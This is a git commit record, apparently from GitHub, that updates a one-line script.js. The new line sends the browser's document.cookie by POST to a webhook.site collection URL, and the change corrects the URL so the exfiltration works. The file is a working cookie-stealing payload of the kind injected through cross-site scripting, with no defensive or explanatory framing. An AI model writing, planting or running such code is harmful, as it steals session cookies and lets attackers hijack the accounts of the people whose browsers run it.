eabc29abadde6c92be89140a1c4ed3521e88eaf2
Vicente Gomes <72041855+Vicente-Gomes@users.noreply.github.com>
2024-12-06 22:24:22 +0000

    Update script.js

--- script.js
+++ script.js
@@ -1,1 +1,1 @@
-fetch('https://webhook.site/0973988c-7f2d-4cc9-8888-bc95f808f585cookie=', {method: 'POST', body: document.cookie});
+fetch('https://webhook.site/0973988c-7f2d-4cc9-8888-bc95f808f585', {method: 'POST', body: document.cookie});
